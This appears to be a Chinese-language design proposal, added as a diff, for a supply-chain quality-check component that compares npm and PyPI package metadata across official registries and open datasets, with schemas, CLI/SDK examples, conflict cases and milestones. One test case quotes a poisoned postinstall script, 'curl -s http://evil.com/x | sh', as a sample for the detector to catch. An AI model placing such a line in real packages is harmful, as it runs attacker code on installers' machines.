@@ -1,0 +1,474 @@
+# NLnet CodeSupply 最小样例 Demo（PoC）设计修改方案（Rev 1）
+
+> **设计基准与变更说明**  
+> 本方案依据 Astra 终审裁决（`ASTRA-ADJUDICATION-2026-10-13.md`）对原 Demo 技术设计（`taskB-gemini.txt`）进行彻底重构。  
+> **核心变更项**：
+> 1. **定位升维与解耦接入**：从原先单源爬虫/自建扫描器，全面重构为“**可供 CodeSupply 聚合管线接入的独立质检组件**”，完备定义上游元数据输入、多维质检产物输出与聚合方接入方式（CLI / SDK）。
+> 2. **核心增量聚焦**：坚决剥离“PURL 存在性探测”、“基础格式解析”等已被 AboutCode / purl-spec 覆盖的常规功能，技术增量严格聚焦于“**带来源、时间和可复现证据的跨源差异判定与生命周期追踪**”。
+> 3. **生态锁定与哈希硬约束**：锁定 **npm** 与 **PyPI** 两个核心生态，每生态建立“官方 Registry ↔ 开放数据集”双源对照机制；在校验规则底层建立“**同一制品、同一算法**”哈希比对硬约束，杜绝跨物料误判；设计 4 类可运行的冲突判定基准样例。
+> 4. **里程碑与量化验收对齐**：全面对齐 Astra 终审裁决的 M1–M4（总预算 €15,000，9 个月交付 + 12 个月返修保障），量化覆盖率、样本数与离线复跑 100% 一致性。
+> 
+> **技术负责人（申请人/lead）**：Joey（Jigao Yi），个人申请
+
+---
+
+## 1. 组件定位、技术增量与接入规范
+
+### 1.1 组件定位：CodeSupply 聚合管线的独立质检组件
+
+本项目设计为 **CodeSupply 跨生态元数据聚合管线中的独立质检与仲裁组件（Standalone Quality Assurance & Cross-Source Adjudication Sentinel）**。
+
+在 NLnet CodeSupply 整体生态体系中，官方核心联盟（€3M 级别）负责大规模多源抓取、数据湖汇聚与主干管线运营；本组件**不重复造通用抓取轮子，不自建竞争性数据仓库**，而是作为可拔插的“质检哨兵”与“冲突裁判”接入聚合流：
+- **位置**：置于 CodeSupply 原始数据抽取（Extract/Harvest）之后、权威主元数据写入（Consensus Store）之前。
+- **职责**：针对进入管线的任意包版本（PURL），对来自官方源、第三方镜像源、安全审计快照等多源元数据进行微秒级到秒级的规范化对齐、时间序列冲突仲裁、制品物理一致性验证及生命周期异常侦测。
+
+```
+[CodeSupply 上游抽取 / 多源 Feed]
+  (Official Registries / ClearlyDefined / deps.dev / OSV)
+                        │
+                        ▼  (输入: 聚合观测记录 Stream / Batch)
+        ┌──────────────────────────────────────────────┐
+        │   CodeSupply Sentinel (本独立质检组件)        │
+        │  ──────────────────────────────────────────  │
+        │  1. 跨源字段对齐层 (Cross-Source Aligner)      │
+        │  2. 哈希强约束检验 (Artifact Hash Enforcer)   │
+        │  3. 时间与证据仲裁引擎 (Adjudication Engine) │
+        │  4. 生命周期与版本追踪 (Lifecycle Tracker)     │
+        └──────────────────────────────────────────────┘
+                        │
+         分流输出 ──────┴───────┐
+         ▼                      ▼
+[实时校验结论产物]       [周期性质检快照数据集]
+(Validation Verdict)    (Verified Dataset Snapshot)
+  - 阻断真实篡改/投毒     - 列式 Parquet + JSONL
+  - 标记同步延迟窗口       - 支持 DuckDB / 离线复跑
+  - 解构语义差异映射       - 输出源数据质量评分卡 (M3)
+  - 挂起不可判定证据
+```
+
+---
+
+### 1.2 核心增量：带来源、时间与可复现证据的跨源判定与生命周期追踪
+
+为避免学术包装与功能虚浮，本方案明确划分技术红线：
+- **非创新项（彻底剔除/降级为底层库依赖）**：
+  - 基础 Package URL (PURL) 字符串规范化与语法校验（直接复用官方 `packageurl-python` 与已有的 PURL 官方测试集）。
+  - 单一注册表的普通存在性探测（AboutCode `purl-validator` 已有基础探测能力）。
+  - 单一 SPDX 许可证合法性正则匹配（直接复用 AboutCode `license-expression`）。
+- **真实技术增量（核心价值所在）**：
+  1. **带时间维度的跨源状态仲裁**：引入“观测时间戳序列（Observation Timeline）”与“源权威性拓扑（Authority Graph）”，能够区分“真实数据篡改”与“分布式抓取节点的正常同步延迟（Replication Lag）”，避免将下游缓存未同步误报为安全事件。
+  2. **带密码学与物理证据链的归因报告**：每一项冲突判定不仅给出布尔结论，更输出完整的反事实证据链条（包含对照源 URL、HTTP 响应快照哈希、Tarball/Wheel 物理检查指标、官方发布声明、签名凭据快照），支持第三方零依赖完全复现。
+  3. **生命周期对抗性追踪**：捕获官方源与开放数据集之间的“隐蔽变更”——如幽灵撤回（Silent Unpublish / Yank）、历史哈希覆写（Mutation）、发布者凭据交割异动（Publisher Drift）以及预发布向正式版突变的语义漂移。
+
+---
+
+### 1.3 输入规范：上游元数据输入格式（Input Specification）
+
+组件设计为“双模输入”：既支持接入 CodeSupply 上游管线推送的聚合观测数据，也支持独立运行模式下的直接多源探测。上游输入采用标准的 JSONL 流式记录或批量 JSON，结构定义如下：
+
+```json
+{
+  "$schema": "https://codesupply.net/schemas/v1/package-observation.json",
+  "purl": "pkg:npm/%40example/auth-core@2.1.0",
+  "pipeline_trace_id": "cs-pipe-20261018-092044-8842",
+  "requested_at": "2026-10-18T09:20:44.102Z",
+  "observations": [
+    {
+      "source_id": "npm-official-registry",
+      "source_type": "official_registry",
+      "observed_at": "2026-10-18T09:20:44.215Z",
+      "status_code": 200,
+      "metadata": {
+        "published_at": "2026-10-18T08:00:00.000Z",
+        "publisher": { "name": "alice_sec", "email": "alice@example.com" },
+        "maintainers": [{ "name": "alice_sec", "email": "alice@example.com" }],
+        "declared_license": "Apache-2.0",
+        "git_head": "8a3cf14a1c5d9bf16c3905c065fbd4a6e3c631a0",
+        "artifacts": [
+          {
+            "filename": "auth-core-2.1.0.tgz",
+            "artifact_type": "tarball",
+            "download_url": "https://registry.npmjs.org/@example/auth-core/-/auth-core-2.1.0.tgz",
+            "declared_hashes": {
+              "sha512": "4d7f...b9a1",
+              "sha1": "89ab...c123"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "source_id": "clearlydefined-harvest",
+      "source_type": "open_dataset",
+      "observed_at": "2026-10-18T09:20:44.430Z",
+      "status_code": 200,
+      "metadata": {
+        "harvested_at": "2026-10-18T08:15:20.000Z",
+        "declared_license": "Apache-2.0",
+        "discovered_license": "Apache-2.0",
+        "artifacts": [
+          {
+            "filename": "auth-core-2.1.0.tgz",
+            "artifact_type": "tarball",
+            "download_url": "https://api.clearlydefined.io/harvest/.../auth-core-2.1.0.tgz",
+            "declared_hashes": {
+              "sha512": "4d7f...b9a1"
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
+```
+
+---
+
+### 1.4 输出规范：质检结论与数据集产物（Output Specification）
+
+组件输出两大产物：**实时质检结论产物（Per-record Verdict）** 与 **全量/增量快照数据集（Snapshot Dataset）**。
+
+#### 1.4.1 质检结论产物（Validation Verdict）
+输出为具备机器可读性与审计可溯性的 JSON / JSONL 对象：
+```json
+{
+  "purl": "pkg:npm/%40example/auth-core@2.1.0",
+  "trace_id": "cs-pipe-20261018-092044-8842",
+  "evaluated_at": "2026-10-18T09:20:45.050Z",
+  "verdict": "CONFLICT",
+  "conflict_class": "REAL_ERROR",
+  "severity": "CRITICAL",
+  "action_recommendation": "BLOCK_INGESTION",
+  "summary": "Artifact integrity verification failed: physical SHA-512 does not match registry declaration.",
+  "evidence_matrix": {
+    "primary_source": "npm-official-registry",
+    "comparison_source": "physical-tarball-stream",
+    "rule_triggered": "RULE_INT_001_HASH_MISMATCH",
+    "target_artifact": "auth-core-2.1.0.tgz",
+    "algorithm": "sha512",
+    "values": {
+      "registry_declared": "4d7f8a9...b9a1",
+      "physically_computed": "e3b0c44...9982"
+    },
+    "timestamp_context": {
+      "published_at": "2026-10-18T08:00:00Z",
+      "inspected_at": "2026-10-18T09:20:45Z"
+    }
+  },
+  "scorecard_impact": {
+    "source_penalized": "npm-official-registry",
+    "metric": "integrity_pass_rate",
+    "delta": -1
+  }
+}
+```
+
+#### 1.4.2 质检快照数据集格式（Snapshot Datasets）
+导出为双格式：
+1. `verified_records.parquet`：列式压缩存储（Snappy / ZSTD），schema 严格固化（包含 `purl`, `ecosystem`, `verdict`, `conflict_class`, `published_at`, `evaluated_at`, `evidence_json` 等），供 DuckDB 秒级查询与治理分析。
+2. `verified_records.jsonl`：流式换行 JSON，供轻量级命令行与下游管道读取。
+
+---
+
+### 1.5 接入示例：CodeSupply 聚合方如何调用
+
+#### 1.5.1 CLI 命令行接入示例
+
+**场景 A：接入 Unix 标准流水线（流式质检过滤）**
+```bash
+# 从上游抓取管道读取多源数据，执行质检，将严重冲突拦截并导出审计报告
+cat upstream_feed.jsonl \
+  | codesupply-sentinel verify --mode stream --fail-on-critical \
+  --output-clean clean_feed.jsonl \
+  --output-quarantine quarantine_audit.jsonl
+```
+
+**场景 B：单包即时仲裁（按 PURL 指定对照源）**
+```bash
+# 对指定包版本触发 PyPI 官方源与 deps.dev 对照源质检
+codesupply-sentinel inspect "pkg:pypi/cryptography@42.0.5" \
+  --sources "pypi_official,deps_dev" \
+  --cache-dir /tmp/cs-cache \
+  --format rich-table
+```
+
+**场景 C：离线数据快照复跑（M3 确定性验收）**
+```bash
+# 基于 M1/M2 保存的固定输入快照文件离线复跑，验证 100% 幂等一致性
+codesupply-sentinel replay \
+  --snapshot-input ./tests/fixtures/snapshot_20261020.jsonl \
+  --compare-with ./data/golden_verdicts.parquet \
+  --assert-zero-diff
+```
+
+#### 1.5.2 API / Python SDK 接入示例
+
+提供轻量、低依赖的 Python 客户端 SDK，方便直接嵌入 CodeSupply 聚合 Worker：
+
+```python
+from codesupply_sentinel import SentinelAdjudicator, ValidationOptions
+from codesupply_sentinel.models import PackageObservationBatch
+
+# 1. 初始化质检仲裁器（注入规则配置与缓存适配器）
+adjudicator = SentinelAdjudicator(
+    options=ValidationOptions(
+        allow_replication_lag_seconds=86400,  # 允许 24 小时同步窗口
+        enforce_strict_hash=True,              # 强制相同制品+算法校验
+        download_physical_artifacts=True       # 启用物理物料解包核验
+    )
+)
+
+# 2. 在 CodeSupply Worker 中处理抓取批次
+def process_codesupply_batch(raw_json_record: str):
+    observation = PackageObservationBatch.model_validate_json(raw_json_record)
+    
+    # 3. 执行多源交叉质检与仲裁
+    verdict_report = adjudicator.adjudicate(observation)
+    
+    if verdict_report.verdict == "FAIL" and verdict_report.conflict_class == "REAL_ERROR":
+        # 发现真实数据篡改或投毒，阻断并告警
+        log_security_alert(verdict_report.evidence_matrix)
+        quarantine_queue.push(verdict_report.model_dump_json())
+    elif verdict_report.verdict == "WARN" and verdict_report.conflict_class == "SYNC_DELAY":
+        # 下游源延迟，允许入库并标记待重试
+        staging_queue.push(verdict_report.model_dump_json(), retry_after_hours=2)
+    else:
+        # 校验通过或良性语义差异，放行主元数据仓库
+        main_consensus_db.commit(verdict_report.normalized_consensus_record)
+```
+
+---
+
+## 2. 生态锁定、多源对照与真实冲突样例设计
+
+### 2.1 双生态与四对照源锁定
+
+本轮严格收窄范围，锁定两个最大、最具代表性的开源包生态，每个生态绑定“**官方 Registry 原厂接口 ↔ 开放数据集**”双源对照：
+
+| 生态 | 对照源 1（官方原厂接口） | 对照源 2（开放数据集 / 镜像基准） | 对照重点与互补价值 |
+|---|---|---|---|
+| **npm** | **npm Registry CouchDB API**<br>(`registry.npmjs.org/<pkg>`)<br>+ 官方 Tarball 下载流 | **ClearlyDefined API / Harvest 快照**<br>(`api.clearlydefined.io/definitions/...`) | - 官方源提供原作者声明、发布时间戳与发布者凭据；<br>- ClearlyDefined 提供静态代码扫码许可证提取与归档快照；<br>- 对照核心：声明 vs 扫描漂移、物理 Tarball 篡改。 |
+| **PyPI** | **PyPI Warehouse API**<br>(`pypi.org/pypi/<pkg>/json` / PEP 691)<br>+ PEP 740 出处证明 | **deps.dev API (Open Source Insights)**<br>(`api.deps.dev/v3/systems/pypi/...`) | - 官方源提供 Wheel/sdist 元数据及 Sigstore 证明；<br>- deps.dev 提供全图谱依赖快照与许可证归一化；<br>- 对照核心：Wheel 构建物哈希一致性、Yank 撤回状态同步。 |
+
+---
+
+### 2.2 哈希比对硬约束（Hard Invariant: Same Artifact, Same Algorithm）
+
+在供应链多源校验中，跨文件格式（例如误将 sdist `.tar.gz` 与 wheel `.whl` 比对）或跨算法截断比对是导致“假阳性告警（False Positive Storm）”的头号杀手。
+
+**本方案将此提升为规则引擎的最高优先级硬约束**：
+
+```
+[哈希比对前置断言 Assertions]
+  ├── 断言 1: 制品归一化标识相同 (Exact Artifact Identity Match)
+  │    └── 文件名与格式后缀必须 100% 字符匹配 (e.g., pkg-1.0-py3-none-any.whl == pkg-1.0-py3-none-any.whl)
+  │    └── 严禁: .tar.gz 对比 .whl / 源码压缩包对比发布二进制
+  └── 断言 2: 哈希加密算法标识相同 (Exact Algorithm Match)
+       └── 双方声明算法必须标准化映射后一致 (e.g., sha256 == sha256, sha512 == sha512)
+       └── 严禁: sha1 对比 sha256 / 截断哈希推断
+
+[异常处理逻辑]
+  若输入违反上述断言:
+    -> 严禁输出判定结论 FAIL / TAMPERED (严禁误判为安全攻击)
+    -> 引擎抛出不可比错误状态: E_HASH_INCOMPARABLE
+    -> 报告归类为: INDETERMINATE (无法判定) + 附带前置校验失败证据
+```
+
+---
+
+### 2.3 四类真实冲突样例可运行设计
+
+设计 4 个完全可构造、可重放的基准冲突用例，覆盖供应链质检的核心难点：
+
+#### 样例 1：真实错误（Real Error / Data Corruption & Tampering）
+- **场景描述**：npm 生态下，物理 Tarball 的 SHA-512 哈希与 Registry 官方元数据记录发生冲突，或内部解包 `package.json` 被植入未声明的高危生命周期外联脚本。
+- **输入构造**：
+  - `Source A (npm Registry API)`: 声明 `express-mock@1.0.1` 的 `dist.integrity` 为 `sha512-Alpha...`，`scripts` 为空。
+  - `Source B (物理下载流)`: 实际拉取 `dist.tarball`，流式计算哈希得到 `sha512-Beta...`；解包内部文件发现存在 `scripts.postinstall = "curl -s http://evil.com/x | sh"`。
+- **期望判定输出**：
+  - `verdict`: `FAIL`
+  - `conflict_class`: `REAL_ERROR`
+  - `severity`: `CRITICAL`
+  - `rule_id`: `RULE_INT_001_HASH_MISMATCH` & `RULE_DFT_001_METADATA_DRIFT`
+- **判定依据字段与归因逻辑**：
+  - 制品与算法对齐满足硬约束（同为 `express-mock-1.0.1.tgz` 的 `sha512`）。
+  - 对比字段：`registry.dist.integrity` (`sha512-Alpha...`) $\neq$ `actual_stream.sha512` (`sha512-Beta...`)。
+  - 归因：直接物理凭据违背，判定为镜像中间人攻击、存储损坏或恶意投毒，触发最高级阻断。
+
+#### 样例 2：同步延迟（Replication Lag / Sync Delay）
+- **场景描述**：PyPI 上游作者刚刚发布了一个安全补丁版本，官方 Registry 已就绪；但第三方开放数据集（如 deps.dev 或 ClearlyDefined）尚未完成抓取爬虫队列，返回 404 或仍将前一版本标注为 `latest`。
+- **输入构造**：
+  - `Source A (PyPI Warehouse API)`: `requests@2.32.0` 存在，`upload_time` = `2026-10-18T10:00:00Z`。当前仲裁时间 = `2026-10-18T11:00:00Z`（仅距发布 1 小时）。
+  - `Source B (deps.dev API)`: `requests@2.32.0` 查询返回 `404 Not Found`，最后爬取刷新时间 `last_indexed` = `2026-10-18T09:30:00Z`。
+- **期望判定输出**：
+  - `verdict`: `WARN`
+  - `conflict_class`: `SYNC_DELAY`
+  - `severity`: `LOW`
+  - `suggested_action`: `RETRY_AFTER_WINDOW`（附注：容忍窗口 24h）
+- **判定依据字段与归因逻辑**：
+  - 判定字段：`abs(current_time - SourceA.upload_time) = 3600s < REPLICATION_TOLERANCE_SECONDS (86400s)`。
+  - 辅助字段：`SourceB.last_indexed < SourceA.upload_time`。
+  - 归因：下游数据源的快照时间早于上游发布时间，且处于合理同步延迟窗口期，判定为无害的同步延迟，不计为源故障，不阻断正常流水线。
+
+#### 样例 3：语义差异（Semantic Divergence / Schema Mismatch）
+- **场景描述**：PyPI 官方元数据中作者填写的许可证字段为非标准文本，而 ClearlyDefined 经过 ScanCode 工具扫描抽取出了规范的 SPDX 标识符。
+- **输入构造**：
+  - `Source A (PyPI API)`: `info.license` = `"Apache 2.0 and MIT"`（自由文本声明）。
+  - `Source B (ClearlyDefined Harvest)`: `licensed.declared` = `"NOASSERTION"`, `licensed.discovered.expressions` = `["Apache-2.0", "MIT"]`（经代码树扫描提取）。
+- **期望判定输出**：
+  - `verdict`: `PASS_WITH_NORMALIZATION`
+  - `conflict_class`: `SEMANTIC_DIVERGENCE`
+  - `severity`: `INFO`
+  - `mapping_result`: `{ "canonical_spdx": "Apache-2.0 AND MIT", "mapping_path": "DISCOVERED_SUPERSEDES_DECLARED" }`
+- **判定依据字段与归因逻辑**：
+  - 判定字段：`SourceA.license_type == 'author_declared'` 对比 `SourceB.license_type == 'tool_discovered'`。
+  - 归因：两源非事实性黑白矛盾，而是“作者非标声明”与“自动化工具深度挖掘”之间的规范化粒度差异。质检器产出双源映射对照矩阵，将其归一化为合法 SPDX 2.3 表达式，记为语义差异。
+
+#### 样例 4：无法判定（Indeterminate / Ambiguity）
+- **场景描述**：历史久远的冷门包发生元数据矛盾，官方源返回 `yanked`（已撤回但未保留理由），第三方开放源保留了历史版本元数据但无哈希；原下载链接均已 404，且两端均无 Sigstore / SLSA 密码学签名证明。
+- **输入构造**：
+  - `Source A (PyPI API)`: `pkg:pypi/legacy-tool@0.5.0` 标记 `yanked: true`, `yanked_reason: null`，所有 `urls` 列表为空（已被物理擦除）。
+  - `Source B (第三方快照)`: 记录 `version: 0.5.0`, `dependencies: ["urllib3<1.0"]`，但缺失 `hashes` 记录。
+  - 双方均无 Sigstore Attestation，无 Git Commit 追溯哈希。
+- **期望判定输出**：
+  - `verdict`: `INDETERMINATE`
+  - `conflict_class`: `INDETERMINATE`
+  - `severity`: `MEDIUM`
+  - `action_recommendation`: `MANUAL_AUDIT_REQUIRED`
+- **判定依据字段与归因逻辑**：
+  - 判定字段：`artifacts.available == false` 且 `signatures.present == false` 且 `source_records.conflicting == true`。
+  - 归因：既无法取得物理制品验证哈希，又缺乏受信任的第三方密码学公钥签名链条，在确定性原则下无法单凭任何一方的无签名元数据推断真相，故明确裁决为“无法判定”，挂起交由人工或二级安全系统复核。
+
+---
+
+## 3. 详细架构设计与模块划分
+
+### 3.1 模块架构图
+
+```
+                       ┌────────────────────────┐
+                       │   CLI / Pipeline SDK   │
+                       └───────────┬────────────┘
+                                   │
+      ┌────────────────────────────┼───────────────────────────┐
+      ▼                            ▼                           ▼
+┌──────────────┐          ┌─────────────────┐         ┌─────────────────┐
+│ Ingester     │          │ Normalizer &    │         │ Adjudication    │
+│ 采集适配器   │          │ Aligner 对齐层  │         │ Engine 判定引擎 │
+├──────────────┤          ├─────────────────┤         ├─────────────────┤
+│ • npm Client │          │ • Schema 对齐   │         │ • 哈希硬约束器  │
+│ • PyPI Client│ ───────> │ • PURL/SPDX 归一│ ──────> │ • 4 类冲突仲裁  │
+│ • Stream 拉取│          │ • 时间轴重排    │         │ • 证据矩阵生成  │
+└──────────────┘          └─────────────────┘         └────────┬────────┘
+                                                               │
+                                  ┌────────────────────────────┘
+                                  ▼
+                    ┌───────────────────────────┐
+                    │ Exporter & Scorecard      │
+                    │ 产物与评分卡导出          │
+                    ├───────────────────────────┤
+                    │ • JSONL / Parquet 导出器  │
+                    │ • 离线复跑确定性对比器    │
+                    │ • 源数据质量评分卡生成器  │
+                    └───────────────────────────┘
+```
+
+### 3.2 目录结构规划
+
+```text
+codesupply-sentinel/
+├── README.md                      # 架构理念、接入指南与复现手册
+├── pyproject.toml                 # PEP 621 依赖声明 (严格把控 FOSS 许可证)
+├── src/
+│   └── cs_sentinel/
+│       ├── __init__.py
+│       ├── cli.py                 # CLI 入口 (Typer 驱动)
+│       ├── core/
+│       │   ├── models.py          # Pydantic V2 强类型领域模型
+│       │   ├── exceptions.py      # E_HASH_INCOMPARABLE 等确定性异常定义
+│       │   └── constants.py       # 时间容忍窗口与冲突分类常量
+│       ├── aligner/               # 模块 1: 跨源元数据对齐层
+│       │   ├── npm_aligner.py     # npm 官方 vs ClearlyDefined 对齐适配
+│       │   ├── pypi_aligner.py    # PyPI Warehouse vs deps.dev 对齐适配
+│       │   └── timeline.py        # 观测时间戳时序排定
+│       ├── adjudicator/           # 模块 2: 差异判定与仲裁引擎
+│       │   ├── engine.py          # 仲裁决策主流程
+│       │   ├── hash_guard.py      # 同一制品+同一算法硬约束断言器
+│       │   ├── rules/             # 4 类仲裁确定性规则集
+│       │   │   ├── real_error.py
+│       │   │   ├── sync_delay.py
+│       │   │   ├── semantic.py
+│       │   │   └── indeterminate.py
+│       │   └── evidence.py        # 判定证据快照与反事实矩阵生成
+│       ├── lifecycle/             # 模块 3: 生命周期追踪器
+│       │   ├── yank_tracker.py    # Yank/Unpublish 异动捕获
+│       │   └── publisher_drift.py # 维护者接管与幽灵发布者检测
+│       └── exporter/              # 模块 4: 数据集与评分卡导出
+│           ├── parquet_writer.py  # 列式 Parquet 高性能写出
+│           ├── jsonl_writer.py    # 流式 JSONL 管道写出
+│           └── scorecard.py       # 数据源质量评分卡 (M3)
+├── fixtures/                      # 基准测试语料库
+│   ├── conflict_cases/            # 4 类真实冲突样例固化数据
+│   └── snapshots/                 # M3 离线复跑快照
+└── tests/                         # 自动化测试套件
+    ├── test_hash_guard.py         # 哈希比较硬约束单元测试
+    ├── test_adjudicator.py        # 4 类冲突判定回归测试
+    ├── test_replay_idempotency.py # 离线复跑 100% 确定性断言测试
+    └── test_aligners.py           # 对齐层跨源转换测试
+```
+
+### 3.3 依赖清单（严格遵循成熟宽松开源许可证）
+
+| 依赖库 | 最低版本 | 用途 | 开源许可证 |
+|---|---|---|---|
+| `pydantic` | `>=2.6.0` | 跨源规范化领域模型定义与强类型校验 | MIT |
+| `httpx` | `>=0.27.0` | 支持 HTTP/2 与连接池的异步跨源采集客户端 | BSD-3-Clause |
+| `packageurl-python` | `>=0.15.0` | 行业标准 PURL 规范化底层支撑 | MIT |
+| `license-expression` | `>=30.3.0` | SPDX 许可证表达式语法解析与归一化（AboutCode） | Apache-2.0 |
+| `pyarrow` | `>=15.0.0` | 高性能列式内存模型与 Parquet 导出 | Apache-2.0 |
+| `typer` | `>=0.9.0` | 工业级命令行 CLI 工具封装 | MIT |
+| `rich` | `>=13.7.0` | 终端直观报告排版与冲突证据高亮渲染 | MIT |
+
+---
+
+## 4. 里程碑规划、量化验收标准与预算折算
+
+全面对齐 Astra 终审裁决（`ASTRA-ADJUDICATION-2026-10-13.md`）确定的 **€15,000 总预算框架与四阶段里程碑**：
+
+### 4.1 里程碑表与交付物（M1–M4）
+
+| 里程碑 | 周期 | 付款金额 | 占比 | 核心研发内容与交付物 | 量化验收标准 |
+|---|---|---:|---:|---|---|
+| **M1** | 第 1–3 月 | **€6,000** | 40.0% | **对齐层＋端到端核心校验＋可下载小样结果集**<br>- 搭建双生态（npm+PyPI）及 2×2 对照源对齐层；<br>- 实现哈希比较硬约束断言器；<br>- 端到端跑通核心仲裁引擎；<br>- 发布公开可下载的种子验证结果集。 | 1. 自动化测试代码覆盖率 $\ge 80\%$；<br>2. 覆盖 4 类真实冲突各至少 2 个代表性测试用例并通过断言；<br>3. 公开发布包含 $\ge 200$ 个典型包版本、$\ge 500$ 条对照记录的小样结果集（Parquet + JSONL 双格式，含 SHA-256 校验和）。 |
+| **M2** | 第 4–5 月 | **€5,000** | 33.3% | **生命周期规则、边界语料及正式校验数据集**<br>- 实现生命周期异动引擎（Yank/Unpublish/维护者变动追踪）；<br>- 构建涵盖特殊版本号、超长 SPDX 嵌套、极端网络元数据的边界语料库；<br>- 扩充全量流水线，发布正式校验数据集。 | 1. 边界测试语料库覆盖 $\ge 100$ 个极端边缘 Case，回归测试 100% 通过；<br>2. 单元与集成测试覆盖率提升至 $\ge 85\%$；<br>3. 正式校验数据集覆盖双生态 $\ge 10,000$ 个主流高频包版本，附带完备冲突统计元报告。 |
+| **M3** | 第 6–7 月 | **€2,500** | 16.7% | **固定输入快照的离线复跑＋数据质量评分卡**<br>- 构建完全气隙隔离（Air-gapped）的离线复跑套件；<br>- 产出针对 4 个对照源的数据质量评分卡系统（Data Quality Scorecard），评估其完整性与延迟率。 | 1. 离线复跑幂等性：基于 M1/M2 固化的固定输入快照，离线复跑输出结论与黄金标准达到 **100% 绝对一致（0 diff）**；<br>2. 评分卡自动化生成针对 npm、PyPI、ClearlyDefined、deps.dev 的量化报告（含延迟分布、冲突率、字段缺失率）。 |
+| **M4** | 第 8–9 月 | **€1,500** | 10.0% | **最终发布、文档、上游提交及约定反馈处理**<br>- 整理生产级部署文档与 CodeSupply 聚合管线集成手册；<br>- GitHub Release 发布 v1.0.0 稳定版；<br>- 向上游核心库（如 AboutCode/purl-validator、CodeSupply 聚合管线相关组件）提交 PR / RFC 规范；<br>- 履行第一轮反馈处理。 | 1. 软件达到可开箱即用状态，通过 Clean-room 环境部署测试；<br>2. 向上游提交 $\ge 1$ 项高质量开源 PR / RFC（**验收以完整提交 PR、测试套件并通过 CI、响应首轮评审为准，不以他方是否合并为前置约束**）；<br>3. 附带完整的 12 个月内返修保障承诺。 |
+
+---
+
+### 4.2 预算拆分与工时折算
+
+依据终审意见核算，扣除必需的基础设施与测试凭据费用后，工时折算如下：
+- **总预算**：€15,000
+- **非人工费用预扣**：€200（用于测试域名、快照分发 CDN 与 CI 矩阵算力微量补贴）
+- **净人工预算**：€14,800
+- **费率与工时选型推荐**：
+  - **选项 A（推荐）**：**€55/h，对应约 269 人时**。
+    - *推荐理由*：更充裕的工时储备（约 269 小时），平摊在 9 个月的主动开发期约为每月 30 小时（约 0.19 FTE），同时预留了充足的工时覆盖 12 个月内的 NLnet 验收答辩与潜在返修工作，风险边际最高。
+  - **选项 B**：**€60/h，对应约 246 人时**。
+    - 顶格报销单价，但总工时减少约 23 小时，在处理上游社区 PR 沟通与极端冲突复现时容错余量略紧。
+
+---
+
+## 5. 项目团队与 PoC 开工验证路径
+
+### 5.1 人员配置与角色分工
+- **项目角色与职责**：
+  - **架构与质检核心负责人（申请人/lead）**：Joey（Jigao Yi），个人申请（负责跨源对齐协议、哈希硬约束引擎、冲突仲裁逻辑及与 CodeSupply 上游对接；0.2 FTE 占位，资助付给实际做工作的人）。
+  - **数据工程与测试支持**：由项目技术骨干兼任（负责多源快照抓取、离线复跑套件及 Parquet 数据集流水线）。
+
+### 5.2 10/20 前最小 PoC 验证与自测步骤（不写完整代码，仅供开工指引）
+1. **输入固化**：在 `fixtures/conflict_cases/` 目录手工固化上述 4 类冲突的原始 JSON 样本。
+2. **断言验证**：编写 `test_adjudicator.py`，验证当传入跨制品哈希比对时立即抛出 `E_HASH_INCOMPARABLE`，且 4 类冲突分别输出 `REAL_ERROR`, `SYNC_DELAY`, `SEMANTIC_DIVERGENCE`, `INDETERMINATE`。
+3. **样本生成**：批量导出包含 200 个版本的 `seed_sample.parquet` 与 `seed_sample.jsonl`，打包附于 NLnet 提案附录中，以此作为具备无可辩驳可复现性的工程证据。
+DSH_EXIT=0
